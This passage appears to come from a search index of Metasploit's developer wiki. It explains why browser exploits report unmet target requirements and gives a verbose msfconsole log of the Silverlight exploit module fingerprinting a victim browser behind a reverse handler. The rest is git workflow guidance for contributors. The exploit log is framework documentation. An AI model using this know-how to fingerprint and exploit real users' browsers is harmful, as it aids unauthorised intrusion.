means one of the following: Your target doesn't have the right conditions to be exploited. Your target isn't vulnerable at all. The exploit should say what requirements are not met. The requirements are explained here: Key Description :source Target has JavaScript disabled. :ua_name Target isn't using the preferred browser. For example: Firefox, IE. :ua_ver Target isn't using the preferred browser version. :os_name Target isn't using the preferred operating system. :os_flavor This has been deprecated. If you see this, your Metasploit is most likely out of date. :language Target isn't using the preferred OS language. :arch Target isn't on the preferred architecture. For example: x86/x64 :proxy Target has a proxy. :silverlight Target doesn't have Silverlight installed. :office Target doesn't have the preferred version of Microsoft Office installed, so the exploit cannot bypass DEP. :java Target doesn't have the preferred version of Java. Often this is used by exploits to bypass DEP. :clsid Target doesn't have the preferred ActiveX control. If this is the problem, you will only see a mismatch with :activex instead of :clsid. :method Target doesn't have the preferred ActiveX control. If this is the problem, you will only see a mismatch with :activex instead of :method. :mshtml_build Target isn't on the preferred build of Internet Explorer. Usually means only specific builds of IE are vulnerable. :flash Target isn't using the preferred version of Adobe Flash. Often this is used by exploits to leverage code execution. :vuln_test A custom JavaScript-based check. There should be a custom vuln_test_error message explaining why on msfconsole. How to manually check requirement comparisons: If you'd like to check the comparisons, simply set VERBOSE to true. The following is an example: msf exploit(ms13_022_silverlight_script_object) > set VERBOSE true VERBOSE => true msf exploit(ms13_022_silverlight_script_object) > run [*] Exploit running as background job. [*] Started reverse handler on 192.168.1.64:4444 [*] Using URL: http://0.0.0.0:8080/SHIzaS2aZxIA6 msf exploit(ms13_022_silverlight_script_object) > [*] Local IP: http://192.168.1.64:8080/SHIzaS2aZxIA6 [*] Server started. [*] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Received cookie 'sVfdquJGHzpHyLItxoTgeJI'. [*] 192.168.1.80 ms13_022_silverlight_script_object - Gathering target information. [*] 192.168.1.80 ms13_022_silverlight_script_object - Sending response HTML. [*] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Info receiver page called. [*] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Received cookie 'ZnKtXOQIvxAclSrEOxJ'. [!] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Received sniffed browser data over POST: {\"os_name\"=>[\"Microsoft Windows\"], \"os_flavor\"=>[\"XP\"], \"ua_name\"=>[\"MSIE\"], \"ua_ver\"=>[\"8.0\"], \"arch\"=>[\"x86\"], \"java\"=>[\"null\"], \"silverlight\"=>[\"false\"], \"flash\"=>[\"null\"], \"office\"=>[\"null\"], \"mshtml_build\"=>[\"18702\"]}. [*] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Received cookie 'ZnKtXOQIvxAclSrEOxJ'. [*] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Serving exploit to user with tag ZnKtXOQIvxAclSrEOxJ [*] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Setting target \"ZnKtXOQIvxAclSrEOxJ\" to :tried. [!] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Comparing requirement: source=(?i-mx:script|headers) vs k=script [!] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Comparing requirement: os_name=Microsoft Windows vs k=Microsoft Windows [!] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Comparing requirement: ua_name=MSIE vs k=MSIE [!] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Comparing requirement: silverlight=true vs k=false [!] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Comparing requirement: arch=x86 vs k=x86 [!] 192.168.1.80 ms13_022_silverlight_script_object - Exploit requirement(s) not met: silverlight Related Reading: https://github.com/rapid7/metasploit-framework/wiki/How-to-write-a-browser-exploit-using-BrowserExploitServer","title":"Information About Unmet Browser Exploit Requirements"},{"location":"dev/dark/Information-About-Unmet-Browser-Exploit-Requirements/#how-to-manually-check-requirement-comparisons","text":"If you'd like to check the comparisons, simply set VERBOSE to true. The following is an example: msf exploit(ms13_022_silverlight_script_object) > set VERBOSE true VERBOSE => true msf exploit(ms13_022_silverlight_script_object) > run [*] Exploit running as background job. [*] Started reverse handler on 192.168.1.64:4444 [*] Using URL: http://0.0.0.0:8080/SHIzaS2aZxIA6 msf exploit(ms13_022_silverlight_script_object) > [*] Local IP: http://192.168.1.64:8080/SHIzaS2aZxIA6 [*] Server started. [*] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Received cookie 'sVfdquJGHzpHyLItxoTgeJI'. [*] 192.168.1.80 ms13_022_silverlight_script_object - Gathering target information. [*] 192.168.1.80 ms13_022_silverlight_script_object - Sending response HTML. [*] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Info receiver page called. [*] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Received cookie 'ZnKtXOQIvxAclSrEOxJ'. [!] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Received sniffed browser data over POST: {\"os_name\"=>[\"Microsoft Windows\"], \"os_flavor\"=>[\"XP\"], \"ua_name\"=>[\"MSIE\"], \"ua_ver\"=>[\"8.0\"], \"arch\"=>[\"x86\"], \"java\"=>[\"null\"], \"silverlight\"=>[\"false\"], \"flash\"=>[\"null\"], \"office\"=>[\"null\"], \"mshtml_build\"=>[\"18702\"]}. [*] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Received cookie 'ZnKtXOQIvxAclSrEOxJ'. [*] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Serving exploit to user with tag ZnKtXOQIvxAclSrEOxJ [*] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Setting target \"ZnKtXOQIvxAclSrEOxJ\" to :tried. [!] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Comparing requirement: source=(?i-mx:script|headers) vs k=script [!] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Comparing requirement: os_name=Microsoft Windows vs k=Microsoft Windows [!] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Comparing requirement: ua_name=MSIE vs k=MSIE [!] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Comparing requirement: silverlight=true vs k=false [!] 192.168.1.80 ms13_022_silverlight_script_object - 192.168.1.80 ms13_022_silverlight_script_object - Comparing requirement: arch=x86 vs k=x86 [!] 192.168.1.80 ms13_022_silverlight_script_object - Exploit requirement(s) not met: silverlight","title":"How to manually check requirement comparisons:"},{"location":"dev/dark/Information-About-Unmet-Browser-Exploit-Requirements/#related-reading","text":"https://github.com/rapid7/metasploit-framework/wiki/How-to-write-a-browser-exploit-using-BrowserExploitServer","title":"Related Reading:"},{"location":"dev/dark/Issue-Labels/","text":"External: touches something in /external, or the Gemfile, or something like that. Heartbleed: Has to do with heartbleed. This will go away soon, but there are three outstanding still... Library: Touches something in /lib. Meterpreter: Has to do with Meterpreter, or depends on a Meterpreter change to land to work. Misc: plugins and scripts, anything that's not otherwise defined. Module: Touches something in /modules Specs: Has specs (an rspec test). Newbie Friendly: Something that's pretty easy to test or tackle.","title":"Issue Labels"},{"location":"dev/dark/Keeping-in-sync-with-rapid7-master/","text":"Some Terminology In this quick HOWTO, we'll be referring to the rapid7 fork of metasploit-framework as upstream . It's a pretty common local configuration, advocated by the development environment setup . Your fork of metasploit-framework will be referred to as origin . The term 'repo' is short for 'Repository.' Also known as 'fork' (as a noun). The Easy Way The easiest way to keep in sync with master is to trash your fork of metasploit-framework , and re-fork. This is a surprisingly common practice, since most people in the world don't work with Metasploit every day. If you're the sort to be struck by hackerish inspiration every few months, and couldn't give a whit about preserving branches, history, or pull requests, simply nuke your local fork. On your fork, in the GitHub UI, go to Settings , scroll down to the Danger Zone , and hit Delete this repository . Once you've re-authenticated, re-fork the metasploit-framework repository by going to the Rapid7 repo and hit Fork as hard as you possibly can. The Hard Way If you're contributing to the Metasploit Framework a lot, first off, THANK YOU. Metasploit is more than a framework, it's a collective and a community of people around the world who are driven to make the Internet -- and therefore, human civilization -- a better place. Gushing aside, if you want to keep in sync with upstream, the hard way (and therefore, best way), is to have a local clone of origin/mestasploit-framework on your local workstation. (Linux is preferred, but there are servicable solutions for OSX and Windows). And, with that said, the GitHub documentation is pretty excellent in explaining how to do this -- it's really not all that hard. Take a look at their Fork A Repo docs, and do what it says. One thing I like to do is to keep separate branches for master (which tracks origin/master ), and upstream-master (which tracks, unsurprisingly, upstream/master ). If you just want to know how to add an upstream remote, check it out . Once you've done that, all you need to do is to pull one of these: git checkout -b upstream-master --track upstream/master git checkout master git merge --ff-only upstream-master git commit git push origin Now, this only works well if you never commit to master . If you do, you're going to have a bad time, as you'll eventually hit a dreaded merge conflict . Any change you make, be it for local experimentation or public proposal, should be done in a branch from the master branch (or, if you're a habitual committer, a branch off the upstream-master branch). Ignore this advice at your own peril. The Max Powers Way It's like the wrong way, but faster. - Max Powers If you are allergic to the command line, it is possible to sync with upstream/master via the GitHub web UI. This is a little messy, but it's handy if you have small changes that you don't care to sign (by the way, you should sign your commits ). First, go to the Rapid7 branch , and click the green, somewhat subtle mini-PR button. Then, click Compare across forks , and set base fork to your fork, while leaving the head fork pointing to Rapid7's fork. That'll take you to a URL like this: https://github.com/rapid7/metasploit-framework/compare/YOURGITHUBNAME:master...master Next, you'll hit the big green Create a Pull Request button, which will drop you to a new PR page, against your own fork. Fill it in, then immediately click the PRs icon on the left side, find your new PR, and merge it. This will keep your GitHub-hosted fork up-to-date, and if you prefer using the GitHub UI over a real development environment, you can jump in and start making changes there. This method is especially handy for light changes, like documentation or cosmetic changes to modules. However, using the GitHub UI means that you are necessarily not testing new modules or libraries, and you of course cannot sign your commits, which is horrifying . It's also nice for people very new to GitHub as a collaborative platform.","title":"Some Terminology"},{"location":"dev/dark/Keeping-in-sync-with-rapid7-master/#some-terminology","text":"In this quick HOWTO, we'll be referring to the rapid7 fork of metasploit-framework as upstream . It's a pretty common local configuration, advocated by the development environment setup . Your fork of metasploit-framework will be referred to as origin . The term 'repo' is short for 'Repository.' Also known as 'fork' (as a noun).","title":"Some Terminology"},{"location":"dev/dark/Keeping-in-sync-with-rapid7-master/#the-easy-way","text":"The easiest way to keep in sync with master is to trash your fork of metasploit-framework , and re-fork. This is a surprisingly common practice, since most people in the world don't work with Metasploit every day. If you're the sort to be struck by hackerish inspiration every few months, and couldn't give a whit about preserving branches, history, or pull requests, simply nuke your local fork. On your fork, in the GitHub UI, go to Settings , scroll down to the Danger Zone , and hit Delete this repository . Once you've re-authenticated, re-fork the metasploit-framework repository by going to the Rapid7 repo and hit Fork as hard as you possibly can.","title":"The Easy Way"},{"location":"dev/dark/Keeping-in-sync-with-rapid7-master/#the-hard-way","text":"If you're contributing to the Metasploit Framework a lot, first off, THANK YOU. Metasploit is more than a framework, it's a collective and a community of people around the world who are driven to make the Internet -- and therefore, human civilization -- a better place. Gushing aside, if you want to keep in sync with upstream, the hard way (and therefore, best way), is to have a local clone of origin/mestasploit-framework on your local workstation. (Linux is preferred, but there are servicable solutions for OSX and Windows). And, with that said, the GitHub documentation is pretty excellent in explaining how to do this -- it's really not all that hard. Take a look at their Fork A Repo docs, and do what it says. One thing I like to do is to keep separate branches for master (which tracks origin/master ), and upstream-master (which tracks, unsurprisingly, upstream/master ). If you just want to know how to add an upstream remote, check it out . Once you've done that, all you need to do is to pull one of these: git checkout -b upstream-master --track upstream/master git checkout master git merge --ff-only upstream-master git commit git push origin Now, this only works well if you never commit to master . If you do, you're going to have a bad time, as you'll eventually hit a dreaded merge conflict . Any change you make, be it for local experimentation or public proposal, should be done in a branch from the master branch (or, if you're a habitual committer, a branch off the upstream-master branch). Ignore this advice at your own peril.","title":"The Hard Way"},{"location":"dev/dark/Keeping-in-sync-with-rapid7-master/#the-max-powers-way","text":"It's like the wrong way, but faster. - Max Powers If you are allergic to the command line, it is possible to sync with upstream/master via the GitHub web UI. This is a little messy, but it's handy if you have small changes that you don't care to sign (by the way, you should sign your commits ). First, go to the Rapid7 branch , and click the green, somewhat subtle mini-PR button. Then, click Compare across forks , and set base fork to your fork, while leaving the head fork pointing to Rapid7's fork. That'll take you to a URL like this: https://github.com/rapid7/metasploit-framework/compare/YOURGITHUBNAME:master...master Next, you'll hit the big green Create a Pull Request button, which will drop you to a new PR page, against your own fork. Fill it in, then immediately click the PRs icon on the left side, find your new PR, and merge it. This will keep your GitHub-hosted fork up-to-date, and if you prefer using the GitHub UI over a real development environment, you can jump in and start making changes there. This method is especially handy for light changes, like documentation or cosmetic changes to modules. However, using the GitHub UI means that you are necessarily not testing new modules or libraries, and you of course cannot sign your commits, which is horrifying . It's also nice for people very new to GitHub as a collaborative platform.","title":"The Max Powers Way"},{"location":"dev/dark/Landing-Pull-Requests/","text":"This page is meant for Committers. If you are unsure whether you are a committer, you are not. Metasploit is built incrementally by the community through GitHub's Pull Request mechanism. Submitting pull requests (or PRs) is already discussed in the Dev environment setup documentation. It's important to realize that PRs are a feature of GitHub, not git, so this document will take a look at how to get your git environment to deal with them sensibly. The short story Configure your git environment as described here . Add the fetch = +refs/pull/*/head:refs/remotes/upstream/pr/* line to your .git/config . Add your signing key: git config --global user.signingkey When merging code from a pull request, always, always merge -S --no-ff --edit , and write a meaningful 50/72 commit message that references the original PR as #1234 (not PR1234, not PR#1234, not 1234). For example, your message should look like this: Land #1234, a whizbang bug fix Adds a whiz to the existing bang. It appears that without this, bad things can occasionally happen. Thanks @mcfakepants! Fixes #1024, also see #999. The --no-ff flag goes for PRs that go back to a contributor's branch as well as PRs that land in rapid7's master branch. The -S indicates that you're going to sign the merge with your PGP/GPG key, which is a nice assurance that you're really you. If you're making changes (often the case), merge to a landing branch, then merge that branch to upstream/master with the -S --no-ff --edit options. Handy Git aliases Check out this gist that automates (mostly) landing pull requests, signing the merge commit, all while rarely losing a race with other committers. Fork and clone First, fork and clone the rapid7/metasploit-framework repo, following these instructions . I like using ssh with ~/.ssh/config aliases as described here , but the https method will work, too. Once this is done, you will have a remote repository called \"origin,\" which points to your forked repository on GitHub. You will be doing most of your work in your own fork of Metasploit, even if you have commit rights to Rapid7's fork. Now, we're going to add an \"upstream\" repository to talk to the Rapid7 repository. In addition, we're going to add a magical line to the config file that will let us see all pull requests against the Rapid7 repo (both open and closed). Note that this will take a minute since you're adding some hundreds of megs to your clone's refs. So, open up metasploit-framework/.git/config with your favorite editor, add an upstream remote, and add the pull request refs for both your and Rapid7's forks. In the end, you should have a section that started off like this: [remote \"upstream\"] fetch = +refs/heads/*:refs/remotes/upstream/* fetch = +refs/pull/*/head:refs/remotes/upstream/pr/* url = https://github.com/rapid7/metasploit-framework And now it looks like this: [remote \"upstream\"] fetch = +refs/heads/*:refs/remotes/upstream/* fetch = +refs/pull/*/head:refs/remotes/upstream/pr/* url = git@github.com:rapid7/metasploit-framework.git [remote \"origin\"] fetch = +refs/heads/*:refs/remotes/origin/* fetch = +refs/pull/*/head:refs/remotes/origin/pr/* url = https://github.com/YOURNAME/metasploit-framework Some people like to copy these over into remotes named \"rapid7\" and \"yourusername\" just so they don't have to remember about \"origin\" and \"upstream,\" but for this doc, we'll just assume you have \"origin\" and \"upstream\" defined like this. Now, you can git fetch the remote PRs. This will take a little bit, since we have a couple dozen MBs of pull request data. Storage is cheap, though, right? $ git fetch --all Fetching todb-r7 remote: Counting objects: 13, done. remote: Compressing objects: 100% (1/1), done. remote: Total 7 (delta 6), reused 7 (delta 6) Unpacking objects: 100% (7/7), done. From https://github.com/todb-r7/metasploit-framework * [new ref] refs/pull/1/head -> origin/pr/1 * [new ref] refs/pull/2/head -> origin/pr/2 Fetching upstream remote: Counting objects: 91, done. remote: Compressing objects: 100% (29/29), done. remote: Total 59 (delta 47), reused 42 (delta 30) Unpacking objects: 100% (59/59), done. From https://github.com/rapid7/metasploit-framework [... bunches of tags and PRs ...] * [new ref] refs/pull/1701/head -> upstream/pr/1701 * [new ref] refs/pull/1702/head -> upstream/pr/1702 You can git fetch a remote any time, and you'll get access to the latest changes to all branches and pull requests. Branching from PRs A manageable strategy for dealing with outstanding PRs is to start pre-merge testing on the pull request in isolation. For example, to work on PR #1217, we would: $ git checkout upstream/pr/1217 Note: checking out 'upstream/pr/1217'. You are in 'detached HEAD' state. You can look around, make experimental changes and commit them, and you can discard any commits you make in this state without impacting any branches by performing another checkout. If you want to create a new branch to retain commits you create, you may do so (now or later) by using -b with the checkout command again. Example: git checkout -b new_branch_name HEAD is now at 9e499e5... Make BindTCP test more robust ((no branch)) todb@mazikeen:~/git/rapid7/metasploit-framework ``` ``` $ git checkout -b landing-1217 Now, we're on a local branch identical to the original pull request, and can move on from there. We can make our changes, isolated from master, and then either send them back to the contributor (this requires looking up the original contributor's GitHub username and branch name on GitHub), or if there aren't any changes or the changes are trivial, we can land them (if you have committer rights to Rapid7's repo, this is where you land them to the upstream repo). In this particular case with PR #1217, I did want to send some changes back to the contributor. Important : If the codebase the contributor's PR is based on is severely outdated (e.g., they branched off an outdated master ), you should not test their PR in isolation as described above. Instead, you should create a test branch that is identical to the latest codebase, merge the contributor's PR into the test branch, and then start your testing. Here's an example with #6954 (your workflow may vary): $ git checkout upstream/master Note: checking out 'upstream/master'. You are in 'detached HEAD' state. You can look around, make experimental changes and commit them, and you can discard any commits you make in this state without impacting any branches by performing another checkout. If you want to create a new branch to retain commits you create, you may do so (now or later) by using -b with the checkout command again. Example: git checkout -b <new-branch-name> HEAD is now at afbeb2b... Land #7023, fixes for swagger exploit $ git merge --no-ff --no-edit upstream/pr/6954 Merge made by the 'recursive' strategy. modules/exploits/windows/local/payload_inject.rb | 5 +++++ 1 file changed, 5 insertions(+) [*] Running msftidy.rb in .git/hooks/post-merge mode --- Checking new and changed module syntax with tools/dev/msftidy.rb --- modules/exploits/windows/local/payload_inject.rb - msftidy check passed ------------------------------------------------------------------------ This ensures that the contributor's PR is being tested against the latest codebase and not an outdated one. If you do not do this , when you land the PR, you may end up breaking Metasploit. Checking out branches from a remote forked repo in your forked repo After your .git/config is set up per the above, and you successfully run git fetch --all , you are two steps away from being able to check out a branch from a contributor's forked repo. You need to add their fork once as a remote: git remote add OTHER_USER git://github.com/OTHER_USER/metasploit-framework.git . Now pull down the latest from them: git fetch OTHER_USER . Now you can check out branches from OTHER_USER per usual, e.g. git checkout bug/foo . Making changes $ gvim .gitignore [... make some changes and some commits ...] (landing-1217) todb@mazikeen:~/git/rapid7/metasploit-framework $ git checkout -b pr1217-fix-gitignore-conflict Switched to a new branch 'pr1217-fix-gitignore-conflict' (pr1217-fix-gitignore-conflict) todb@mazikeen:~/git/rapid7/metasploit-framework $ git push origin pr1271-fix-gitignore-conflict (pr1217-fix-gitignore-conflict) todb@mazikeen:~/git/rapid7/metasploit-framework $ git pr-url schierlm javapayload-maven Created new window in existing browser session. This sequence does a few things after editing the .gitconfig. It creates another copy of landing-1217 (which is itself a copy of upstream/pr/1217)). Next, I push those changes to my branch (todb-r7, aka \"origin\"). Finally, I have a mighty .gitconfig alias here to open a browser window to send a pull request to the original contributor's branch (you will want to edit yours to reflect your real GitHub username, of course). pr-url = !\"echo https://github.com/YOURNAME/metasploit-framework/pull/new/HISNAME:HISBRANCH...YOURBRANCH\" Filling in the blanks (provided by the original PR's information from GitHub) gets me: https://github.com/todb-r7/metasploit-framework/pull/new/schierlm:javapayload-maven...pr1217-fix-gitignore-conflict I opened that in a browser, and ended up with https://github.com/schierlm/metasploit-framework/pull/1 . Once @schierlm landed it on his branch (again, using git merge --no-ff and a short, informational merge commit message), all I (or anyone) had to do was git fetch to get the change reflected in upstream/pr/1217, and then the integration of the PR could continue. Collaboration between contributors Note the important bit here: you do not need commit rights to Rapid7 to branch pull requests . If Alice knows a solution to Bob's pull request that Juan pointed out, it is easy for Alice to provide that solution by following the procedure above. git blame will still work correctly, commit histories will all be accurate, everyone on the pull request will be notified of Alice's changes, and Juan doesn't have to wait around for Bob to figure out how to use send_request_cgi() or whatever the problem was. The hardest part is remembering how to construct the pull request to Bob -- lucky for you, this .git/config alias makes that part pretty push-button. Landing to upstream Back to PR #1217. Turns out, my change was enough to land the original chunk of work. So, someone else (@jlee-r7) was able to to do something like this: $ git fetch upstream remote: Counting objects: 12, done. remote: Compressing objects: 100% (2/2), done. remote: Total 7 (delta 5), reused 7 (delta 5) Unpacking objects: 100% (7/7), done. From https://github.com/rapid7/metasploit-framework 9e499e5..263e967 refs/pull/1651/head -> upstream/pr/1651 This all looked good, so he could land this to Rapid7's repo with: $ git checkout -b upstream-master --track upstream/master $ git merge -S --no-ff --edit landing-1217 $ git push upstream upstream-master:master Or, if he already have upstream-master checked out: $ git checkout upstream-master $ git rebase upstream/master $ git merge -S --no-ff --edit landing-1217 $ git push upstream upstream-master:master The --edit is optional if we have our editor configured correctly in $HOME/.gitconfig . The point here is that we always want a merge commit, and we never want to use the (often useless) default merge commit message. For #1217, this was changed to: Land #1217, java payload build system refactor Note that you should rebase before landing -- otherwise, your merge commit will be lost in the rebase. Finally, the -S indicates we are going to sign the merge, using our GPG key. This is a nice way to prove in a secure way that this merge is, in fact, coming from you, and not someone impersonating you. For more on signing merges, see A Git Horror Story: Repository Integrity With Signed Commits . To set yourself up for signing, your .gitconfig (or metasploit-framework/git/.config) file should have these entries: [user] name = Your Name email = your@email.xxx signingkey = DEADBEEF # Must match exactly with your key for \"Your Name <your@email.xxx>\" [alias] c = commit -S --edit m = merge -S --no-ff --edit People with commit rights to rapid7/metasploit-framework will have their keys listed here . Cross-linking PRs, Bugs, and Commits TODO: Update in this new post-Redmine, GitHub issues world Merge conflicts The nice thing about this strategy is that you can test for merge conflicts straight away. You'd use a sequence like: git checkout upstream/pr/1234 git checkout -b landing-1234 git checkout master git checkout -b master-temp git merge landing-1234 master-temp If that works, great, you know you don't have any merge conflicts right now. Questions and Corrections Bug @todb-r7, either on Freenode on the #metasploit channel (he's todb there), or by e-mailing the metasploit-hackers mailing list.","title":"Landing Pull Requests"},{"location":"dev/dark/Landing-Pull-Requests/#the-short-story","text":"Configure your git environment as described here . Add the fetch = +refs/pull/*/head:refs/remotes/upstream/pr/* line to your .git/config . Add your signing key: git config --global user.signingkey When merging code from a pull request, always, always merge -S --no-ff --edit , and write a meaningful 50/72 commit message that references the original PR as #1234 (not PR1234, not PR#1234, not 1234). For example, your message should look like this: Land #1234, a whizbang bug fix Adds a whiz to the existing bang. It appears that without this, bad things can occasionally happen. Thanks @mcfakepants! Fixes #1024, also see #999. The --no-ff flag goes for PRs that go back to a contributor's branch as well as PRs that land in rapid7's master branch. The -S indicates that you're going to sign the merge with your PGP/GPG key, which is a nice assurance that you're really you. If you're making changes (often the case), merge to a landing branch, then merge that branch to upstream/master with the -S --no-ff --edit options.","title":"The short story"},{"location":"dev/dark/Landing-Pull-Requests/#handy-git-aliases","text":"Check out this gist that automates (mostly) landing pull requests, signing the merge commit, all while rarely losing a race with other committers.","title":"Handy Git aliases"},{"location":"dev/dark/Landing-Pull-Requests/#fork-and-clone","text":"First, fork and clone the rapid7/metasploit-framework repo, following these instructions . I like using ssh with ~/.ssh/config aliases as described here , but the https method will work, too. Once this is done, you will have a remote repository called \"origin,\" which points to your forked repository on GitHub. You will be doing most of your work in your own fork of Metasploit, even if you have commit rights to Rapid7's fork. Now, we're going to add an \"upstream\" repository to talk to the Rapid7 repository. In addition, we're going to add a magical line to the config file that will let us see all pull requests against the Rapid7 repo (both open and closed). Note that this will take a minute since you're adding some hundreds of megs to your clone's refs. So, open up metasploit-framework/.git/config with your favorite editor, add an upstream remote, and add the pull request refs for both your and Rapid7's forks. In the end, you should have a section that started off like this: [remote \"upstream\"] fetch = +refs/heads/*:refs/remotes/upstream/* fetch = +refs/pull/*/head:refs/remotes/upstream/pr/* url = https://github.com/rapid7/metasploit-framework And now it looks like this: [remote \"upstream\"] fetch = +refs/heads/*:refs/remotes/upstream/* fetch = +refs/pull/*/head:refs/remotes/upstream/pr/* url = git@github.com:rapid7/metasploit-framework.git [remote \"origin\"] fetch = +refs/heads/*:refs/remotes/origin/* fetch = +refs/pull/*/head:refs/remotes/origin/pr/* url = https://github.com/YOURNAME/metasploit-framework Some people like to copy these over into remotes named \"rapid7\" and \"yourusername\" just so they don't have to remember about \"origin\" and \"upstream,\" but for this doc, we'll just assume you have \"origin\" and \"upstream\" defined like this. Now, you can git fetch the remote PRs. This will take a little bit, since we have a couple dozen MBs of pull request data. Storage is cheap, though, right? $ git fetch --all Fetching todb-r7 remote: Counting objects: 13, done. remote: Compressing objects: 100% (1/1), done. remote: Total 7 (delta 6), reused 7 (delta 6) Unpacking objects: 100% (7/7), done. From https://github.com/todb-r7/metasploit-framework * [new ref] refs/pull/1/head -> origin/pr/1 * [new ref] refs/pull/2/head -> origin/pr/2 Fetching upstream remote: Counting objects: 91, done. remote: Compressing objects: 100% (29/29), done. remote: Total 59 (delta 47), reused 42 (delta 30) Unpacking objects: 100% (59/59), done. From https://github.com/rapid7/metasploit-framework [... bunches of tags and PRs ...] * [new ref] refs/pull/1701/head -> upstream/pr/1701 * [new ref] refs/pull/1702/head -> upstream/pr/1702 You can git fetch a remote any time, and you'll get access to the latest changes to all branches and pull requests.","title":"Fork and clone"},{"location":"dev/dark/Landing-Pull-Requests/#branching-from-prs","text":"A manageable strategy for dealing with outstanding PRs is to start pre-merge testing on the pull request in isolation. For example, to work on PR #1217, we would: $ git checkout upstream/pr/1217 Note: checking out 'upstream/pr/1217'. You are in 'detached HEAD' state. You can look around, make experimental changes and commit them, and you can discard any commits you make in this state without impacting any branches by performing another checkout. If you want to create a new branch to retain commits you create, you may do so (now or later) by using -b with the checkout command again. Example: git checkout -b new_branch_name HEAD is now at 9e499e5... Make BindTCP test more robust ((no branch)) todb@mazikeen:~/git/rapid7/metasploit-framework ``` ``` $ git checkout -b landing-1217 Now, we're on a local branch identical to the original pull request, and can move on from there. We can make our changes, isolated from master, and then either send them back to the contributor (this requires looking up the original contributor's GitHub username and branch name on GitHub), or if there aren't any changes or the changes are trivial, we can land them (if you have committer rights to Rapid7's repo, this is where you land them to the upstream repo). In this particular case with PR #1217, I did want to send some changes back to the contributor. Important : If the codebase the contributor's PR is based on is severely outdated (e.g., they branched off an outdated master ), you should not test their PR in isolation as described above. Instead, you should create a test branch that is identical to the latest codebase, merge the contributor's PR into the test branch, and then start your testing. Here's an example with #6954 (your workflow may vary): $ git checkout upstream/master Note: checking out 'upstream/master'. You are in 'detached HEAD' state. You can look around, make experimental changes and commit them, and you can discard any commits you make in this state without impacting any branches by performing another checkout. If you want to create a new branch to retain commits you create, you may do so (now or later) by using -b with the checkout command again. Example: git checkout -b <new-branch-name> HEAD is now at afbeb2b... Land #7023, fixes for swagger exploit $ git merge --no-ff --no-edit upstream/pr/6954 Merge made by the 'recursive' strategy. modules/exploits/windows/local/payload_inject.rb | 5 +++++ 1 file changed, 5 insertions(+) [*] Running msftidy.rb in .git/hooks/post-merge mode --- Checking new and changed module syntax with tools/dev/msftidy.rb --- modules/exploits/windows/local/payload_inject.rb - msftidy check passed ------------------------------------------------------------------------ This ensures that the contributor's PR is being tested against the latest codebase and not an outdated one. If you do not do this , when you land the PR, you may end up breaking Metasploit.","title":"Branching from PRs"},{"location":"dev/dark/Landing-Pull-Requests/#checking-out-branches-from-a-remote-forked-repo-in-your-forked-repo","text":"After your .git/config is set up per the above, and you successfully run git fetch --all , you are two steps away from being able to check out a branch from a contributor's forked repo. You need to add their fork once as a remote: git remote add OTHER_USER git://github.com/OTHER_USER/metasploit-framework.git . Now pull down the latest from them: git fetch OTHER_USER . Now you can check out branches from OTHER_USER per usual, e.g. git checkout bug/foo .","title":"Checking out branches from a remote forked repo in your forked repo"},{"location":"dev/dark/Landing-Pull-Requests/#making-changes","text":"$ gvim .gitignore [... make some changes and some commits ...] (landing-1217) todb@mazikeen:~/git/rapid7/metasploit-framework $ git checkout -b pr1217-fix-gitignore-conflict Switched to a new branch 'pr1217-fix-gitignore-conflict' (pr1217-fix-gitignore-conflict) todb@mazikeen:~/git/rapid7/metasploit-framework $ git push origin pr1271-fix-gitignore-conflict (pr1217-fix-gitignore-conflict) todb@mazikeen:~/git/rapid7/metasploit-framework $ git pr-url schierlm javapayload-maven Created new window in existing browser session. This sequence does a few things after editing the .gitconfig. It creates another copy of landing-1217 (which is itself a copy of upstream/pr/1217)). Next, I push those changes to my branch (todb-r7, aka \"origin\"). Finally, I have a mighty .gitconfig alias here to open a browser window to send a pull request to the original contributor's branch (you will want to edit yours to reflect your real GitHub username, of course). pr-url = !\"echo https://github.com/YOURNAME/metasploit-framework/pull/new/HISNAME:HISBRANCH...YOURBRANCH\" Filling in the blanks (provided by the original PR's information from GitHub) gets me: https://github.com/todb-r7/metasploit-framework/pull/new/schierlm:javapayload-maven...pr1217-fix-gitignore-conflict I opened that in a browser, and ended up with https://github.com/schierlm/metasploit-framework/pull/1 . Once @schierlm landed it on his branch (again, using git merge --no-ff and a short, informational merge commit message), all I (or anyone) had to do was git fetch to get the change reflected in upstream/pr/1217, and then the integration of the PR could continue.","title":"Making changes"},{"location":"dev/dark/Landing-Pull-Requests/#collaboration-between-contributors","text":"Note the important bit here: you do not need commit rights to Rapid7 